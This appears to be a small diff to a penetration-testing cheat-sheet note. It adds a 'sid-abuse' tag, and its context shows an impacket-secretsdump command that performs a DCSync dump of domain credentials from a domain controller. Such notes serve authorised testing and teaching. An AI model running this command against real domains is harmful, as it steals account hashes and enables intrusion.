@@ -2,6 +2,7 @@
 tags:
   - linux
   - dcsync
+  - sid-abuse
 ---
 ```shell-session
 $ impacket-secretsdump -outputfile <OUTPUT> -just-dc <DOMAIN>/<USER>@<DC-IP>
